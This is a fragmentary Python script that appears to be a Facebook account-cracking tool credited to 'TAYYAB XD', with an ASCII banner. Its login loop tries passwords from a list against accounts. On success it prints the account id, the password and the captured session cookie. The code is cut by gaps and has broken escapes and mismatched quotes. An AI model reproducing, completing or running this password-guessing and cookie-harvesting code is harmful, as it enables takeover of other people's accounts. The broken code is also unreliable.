...
logo = """
         ...
         \033[1;37m$$ |   $$ |  $$ |   $$ |        $$ |    $$ |  $$ |$$ |  $$ |
         \033[1;37m    $$ |   $$ |  $$ |   $$ |        $$ |    $$ |  $$ |$$$$$$$  |
         \033E|;37m \__|   \__|  \__|   \__|        \__|    \__|  \__|\_______/  \033[1;32m XD\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mTAYYAB XD\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/Tayyab.your.dady.feel.it.bacha")
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[TAYYAB-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[TAYYAB-CP] '+uid+' | '+ps+'\x1b[1;97m')
